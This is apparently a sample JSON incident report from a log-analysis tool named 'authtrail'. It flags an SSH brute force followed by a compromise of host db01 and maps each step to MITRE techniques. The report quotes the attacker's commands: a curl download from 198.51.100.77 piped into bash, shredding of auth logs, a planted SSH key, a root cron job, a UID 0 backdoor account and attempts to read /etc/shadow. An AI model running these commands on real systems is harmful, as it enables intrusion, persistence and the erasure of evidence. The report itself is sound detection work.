@@ -1,0 +1,521 @@
+{
+  "tool": "authtrail",
+  "version": "1.0.0",
+  "verdict": "COMPROMISE LIKELY",
+  "summary": "203.0.113.45 made 120 failed logins against 5 accounts, then logged in as 'admin' at 03:14. Within 14 min the session opened a root shell, created UID 0 account 'sysadm', added 'sysadm' to the 'sudo' group, changed the password for 'sysadm', piped a download into a shell, planted an SSH key, changed a cron job and wiped logs.",
+  "sources": [
+    "02_bruteforce_compromise.log"
+  ],
+  "hosts": [
+    "db01"
+  ],
+  "stats": {
+    "lines": 277,
+    "recognized": 277,
+    "unparsed": 0,
+    "events": 182,
+    "failed_logins": 138,
+    "successful_logins": 4,
+    "sudo_commands": 8
+  },
+  "first_event": "2026-10-28T01:00:00",
+  "last_event": "2026-10-28T12:00:00",
+  "incidents": [
+    {
+      "id": 1,
+      "host": "db01",
+      "ip": "203.0.113.45",
+      "user": "admin",
+      "start": "2026-10-28T03:14:11",
+      "end": "2026-10-28T03:29:10",
+      "session_closed": true,
+      "findings": [
+        "ssh.compromise",
+        "sudo.command",
+        "account.uid0",
+        "account.priv_group",
+        "account.password_change",
+        "sudo.command",
+        "sudo.command",
+        "sudo.command",
+        "sudo.command"
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "severity": "critical",
+      "rule": "ssh.compromise",
+      "title": "Login as 'admin' after 120 failed attempts from 203.0.113.45",
+      "detail": "203.0.113.45 failed 120 times against 5 accounts in the preceding 16 min, then logged in as 'admin' with a password: the password for this account was guessed. Treat the account as compromised: reset its password, review what the session did, and block the address.",
+      "mitre": [
+        {
+          "id": "T1110.001",
+          "name": "Brute Force: Password Guessing"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        }
+      ],
+      "ts": "2026-10-28T03:14:11",
+      "end": "2026-10-28T03:29:10",
+      "host": "db01",
+      "ip": "203.0.113.45",
+      "user": "admin",
+      "actor": "admin",
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 182
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 185
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 188
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 190
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 191
+        }
+      ],
+      "why": "203.0.113.45 made 120 failed logins against 5 accounts, then logged in as 'admin' at 03:14",
+      "incident": 1,
+      "base_severity": ""
+    },
+    {
+      "severity": "critical",
+      "rule": "account.uid0",
+      "title": "Second root account 'sysadm' created (UID 0)",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). 'sysadm' was created with UID 0, home /root and shell /bin/bash. Any UID 0 account is root under another name, a classic backdoor that survives a password reset of the real root.",
+      "mitre": [
+        {
+          "id": "T1136.001",
+          "name": "Create Account: Local Account"
+        },
+        {
+          "id": "T1078.003",
+          "name": "Valid Accounts: Local Accounts"
+        }
+      ],
+      "ts": "2026-10-28T03:16:41",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "sysadm",
+      "actor": null,
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 197
+        }
+      ],
+      "why": "created UID 0 account 'sysadm'",
+      "incident": 1,
+      "base_severity": ""
+    },
+    {
+      "severity": "critical",
+      "rule": "account.priv_group",
+      "title": "'sysadm' added to privileged group 'sudo'",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). Members of 'sudo' can become root. Confirm the change was approved.",
+      "mitre": [
+        {
+          "id": "T1098",
+          "name": "Account Manipulation"
+        }
+      ],
+      "ts": "2026-10-28T03:17:05",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "sysadm",
+      "actor": null,
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 198
+        }
+      ],
+      "why": "added 'sysadm' to the 'sudo' group",
+      "incident": 1,
+      "base_severity": "high"
+    },
+    {
+      "severity": "critical",
+      "rule": "sudo.command",
+      "title": "Download piped into a shell (sudo by 'admin')",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). Ran as root from /home/admin: /usr/bin/bash -c curl -fsSL http://198.51.100.77/payload.sh | bash",
+      "mitre": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell"
+        }
+      ],
+      "ts": "2026-10-28T03:19:12",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "admin",
+      "actor": "admin",
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 201
+        }
+      ],
+      "why": "piped a download into a shell",
+      "incident": 1,
+      "base_severity": "high"
+    },
+    {
+      "severity": "critical",
+      "rule": "sudo.command",
+      "title": "Logs or shell history wiped (sudo by 'admin')",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). Ran as root from /home/admin: /usr/bin/shred -u /var/log/auth.log.1",
+      "mitre": [
+        {
+          "id": "T1070.002",
+          "name": "Indicator Removal: Clear Linux or Mac System Logs"
+        },
+        {
+          "id": "T1070.003",
+          "name": "Indicator Removal: Clear Command History"
+        }
+      ],
+      "ts": "2026-10-28T03:27:55",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "admin",
+      "actor": "admin",
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 204
+        }
+      ],
+      "why": "wiped logs",
+      "incident": 1,
+      "base_severity": "high"
+    },
+    {
+      "severity": "high",
+      "rule": "sudo.command",
+      "title": "SSH authorized_keys accessed (sudo by 'admin')",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). Ran as root from /home/admin: /usr/bin/tee -a /root/.ssh/authorized_keys",
+      "mitre": [
+        {
+          "id": "T1098.004",
+          "name": "Account Manipulation: SSH Authorized Keys"
+        }
+      ],
+      "ts": "2026-10-28T03:21:40",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "admin",
+      "actor": "admin",
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 202
+        }
+      ],
+      "why": "planted an SSH key",
+      "incident": 1,
+      "base_severity": "medium"
+    },
+    {
+      "severity": "high",
+      "rule": "sudo.command",
+      "title": "Cron job changed (sudo by 'admin')",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). Ran as root from /home/admin: /usr/bin/crontab -u root /tmp/.c",
+      "mitre": [
+        {
+          "id": "T1053.003",
+          "name": "Scheduled Task/Job: Cron"
+        }
+      ],
+      "ts": "2026-10-28T03:24:03",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "admin",
+      "actor": "admin",
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 203
+        }
+      ],
+      "why": "changed a cron job",
+      "incident": 1,
+      "base_severity": "medium"
+    },
+    {
+      "severity": "medium",
+      "rule": "ssh.bruteforce",
+      "title": "SSH brute force from 203.0.113.45",
+      "detail": "84 failed logins in 10 min (external address), mostly against 'admin' (24), 'postgres' (23), 'root' (18). Internet-facing SSH sees this constantly, so on its own it is noise; what matters is whether a login from this address follows.",
+      "mitre": [
+        {
+          "id": "T1110.001",
+          "name": "Brute Force: Password Guessing"
+        }
+      ],
+      "ts": "2026-10-28T02:58:13",
+      "end": "2026-10-28T03:08:07",
+      "host": "db01",
+      "ip": "203.0.113.45",
+      "user": "",
+      "actor": null,
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 15
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 17
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 18
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 21
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 22
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 24
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 25
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 27
+        }
+      ],
+      "why": "203.0.113.45 brute-forced SSH with 120 failed logins",
+      "incident": null,
+      "base_severity": ""
+    },
+    {
+      "severity": "medium",
+      "rule": "sudo.command",
+      "title": "Interactive root shell (sudo by 'admin')",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). Ran as root from /home/admin: /bin/bash",
+      "mitre": [
+        {
+          "id": "T1548.003",
+          "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
+        }
+      ],
+      "ts": "2026-10-28T03:15:20",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "admin",
+      "actor": "admin",
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 195
+        }
+      ],
+      "why": "opened a root shell",
+      "incident": 1,
+      "base_severity": "low"
+    },
+    {
+      "severity": "medium",
+      "rule": "account.password_change",
+      "title": "Password changed for 'sysadm'",
+      "detail": "During incident #1 (login as 'admin' from 203.0.113.45). Routine unless it happened during an incident.",
+      "mitre": [
+        {
+          "id": "T1098",
+          "name": "Account Manipulation"
+        }
+      ],
+      "ts": "2026-10-28T03:17:30",
+      "end": null,
+      "host": "db01",
+      "ip": "",
+      "user": "sysadm",
+      "actor": null,
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 200
+        }
+      ],
+      "why": "changed the password for 'sysadm'",
+      "incident": 1,
+      "base_severity": "low"
+    },
+    {
+      "severity": "medium",
+      "rule": "ssh.bruteforce",
+      "title": "SSH brute force from 198.51.100.12",
+      "detail": "18 failed logins in 2 min (external address), mostly against 'root' (18). Internet-facing SSH sees this constantly, so on its own it is noise; what matters is whether a login from this address follows.",
+      "mitre": [
+        {
+          "id": "T1110.001",
+          "name": "Brute Force: Password Guessing"
+        }
+      ],
+      "ts": "2026-10-28T05:02:00",
+      "end": "2026-10-28T05:04:12",
+      "host": "db01",
+      "ip": "198.51.100.12",
+      "user": "",
+      "actor": null,
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 208
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 209
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 211
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 212
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 214
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 215
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 217
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 218
+        }
+      ],
+      "why": "198.51.100.12 brute-forced SSH with 18 failed logins",
+      "incident": null,
+      "base_severity": ""
+    },
+    {
+      "severity": "medium",
+      "rule": "sudo.denied",
+      "title": "'bob' refused by sudo 3 times",
+      "detail": "'bob' is not allowed to run these as root: /bin/bash; /usr/bin/cat /etc/shadow. Probing for privileges is typical right after an account is taken over.",
+      "mitre": [
+        {
+          "id": "T1548.003",
+          "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
+        }
+      ],
+      "ts": "2026-10-28T11:43:00",
+      "end": "2026-10-28T11:46:00",
+      "host": "db01",
+      "ip": "",
+      "user": "bob",
+      "actor": "bob",
+      "evidence": [
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 249
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 250
+        },
+        {
+          "source": "02_bruteforce_compromise.log",
+          "line": 251
+        }
+      ],
+      "why": "'bob' tried to use sudo without permission",
+      "incident": null,
+      "base_severity": ""
+    }
+  ],
+  "attack_sources": [
+    {
+      "ip": "203.0.113.45",
+      "internal": false,
+      "pattern": "brute force",
+      "failures": 120,
+      "accounts": {
+        "admin": 28,
+        "postgres": 24,
+        "test": 21,
+        "ubuntu": 15,
+        "root": 32
+      },
+      "logged_in_as": [
+        "admin"
+      ],
+      "first": "2026-10-28T02:58:00",
+      "last": "2026-10-28T03:14:07",
+      "hosts": [
+        "db01"
+      ]
+    },
+    {
+      "ip": "198.51.100.12",
+      "internal": false,
+      "pattern": "brute force",
+      "failures": 18,
+      "accounts": {
+        "root": 18
+      },
+      "logged_in_as": [],
+      "first": "2026-10-28T05:02:00",
+      "last": "2026-10-28T05:04:12",
+      "hosts": [
+        "db01"
+      ]
+    }
+  ],
+  "iocs": {
+    "ips": [
+      "203.0.113.45",
+      "198.51.100.12"
+    ],
+    "accounts": [
+      "sysadm"
+    ],
+    "urls": [
+      "http://198.51.100.77/payload.sh"
+    ]
+  }
+}
